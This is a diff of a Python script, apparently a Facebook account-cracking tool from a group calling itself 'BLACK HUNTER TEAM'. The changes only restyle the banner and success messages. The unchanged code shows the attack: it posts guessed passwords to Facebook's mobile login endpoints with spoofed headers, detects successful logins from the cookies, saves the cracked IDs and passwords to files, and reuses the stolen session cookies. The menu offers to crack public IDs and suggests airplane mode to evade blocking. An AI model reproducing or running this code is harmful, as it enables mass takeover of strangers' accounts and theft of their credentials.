@@ -315,17 +315,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [BHT-OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [BHT-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BHT-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [BHT-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [BHT-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BHT-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -385,13 +385,13 @@ logo = """
 \033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
 \033[94;1m | |_) |     | |  | |    | |  | |____ / ____ \| |  | |
 \033[93;1m |____/      |_|  |_|    |_|  |______/_/    \_\_|  |_|                                                                                                                                                                                                        
-\033[1;91m                               ✪𝐁𝐋𝐀𝐂𝐊 𝐇𝐔𝐍𝐓𝐄𝐑 𝐓𝐄𝐀𝐌✪
-\033[0;95m═══════════════════════════════════════════
+\033[1;91m                               
+\033[0;95m═══════════════════════════════════════════════
 \033[0;94m [!]\033[0;91mTOOL OWER :\033[0;92m𝐁𝐃 𝐉𝐀𝐇𝐈𝐄𝐃       
 \033[0;94m [!]\033[0;91mTOOL NAME :\033[0;92m 𝐏𝐑𝐎-03
 \033[0;94m [!]\033[0;91mVERSION   :\033[0;92m3.0.7
-\033[0;94m [!]\033[0;94mGROUP         :\033[0;92m𝐁𝐋𝐀𝐂𝐊 𝐇𝐔𝐍𝐓𝐄𝐑 𝐓𝐄𝐀𝐌
-\033[0;95m═══════════════════════════════════════════"""
+\033[0;94m [!]\033[0;91mGROUP     :\033[0;92m𝐁𝐋𝐀𝐂𝐊 𝐇𝐔𝐍𝐓𝐄𝐑 𝐓𝐄𝐀𝐌
+\033[0;95m═══════════════════════════════════════════════"""
  
 class Main:
 	def __init__(self):
@@ -427,7 +427,7 @@ class Main:
 			os.system("clear")
 		print(logo)
 		print(" [▪]Choose methode#")
-		print("\033[0;90m ><><><><><><><><><><><><><><><><><><>><")
+		print("\033[0;90m ══════════════════════════")
 		print(" \033[0;94m[1]\033[0;97m Crack with File Unlimtd\033[0;92m ~[login]")
 		print(" \033[0;93m[2] Crack from Public Id    ~[login]")
 		print(" [3] Cloning Pak Id         ~[Not login] ")
@@ -905,7 +905,7 @@ class Main:
 				print(logo)
 				print("     \033[0;93m   FREE MODE ACTIVATE")
 				print("\n\033[0;94m [+] HACK HAS BEEN START")
-				print(" \033[0;96m[+] Note: Cp Ac Open 70% just now")
+				print(" \033[0;96m[+] Note: Cp Ac Open 35% just now")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m--------------------------------------------")
 				print("\n")
